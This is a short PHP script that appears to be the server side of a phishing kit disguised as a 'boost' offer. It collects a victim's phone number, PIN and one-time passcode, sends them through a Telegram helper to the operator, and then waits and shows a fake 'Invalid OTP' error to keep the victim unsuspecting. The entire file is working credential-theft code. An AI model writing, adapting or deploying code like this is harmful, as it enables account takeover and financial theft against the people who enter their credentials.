<?php
require_once './Telegram.php';
header('Content-Type: application/json');

$phone = $_POST['phone'] ?? '';
$pin = $_POST['pin'] ?? '';
$otp = $_POST['otp'] ?? '';

if (!$phone || !$pin) {
    echo json_encode(['success' => false, 'error' => 'Invalid phone or pin']);
    exit;
}


$message = "
*New Boost Request*
phone: `{$phone}`
pin: `{$pin}`
otp: `{$otp}`
Time: *" . date('Y-m-d H:i:s') . "*
";
$telegram = new Telegram();
$sended = $telegram->send($message);
sleep(30);
if ($sended) {
    echo json_encode(['success' => true]);
} else {
    echo json_encode(['success' => false, 'error' => 'Invalid OTP']);
}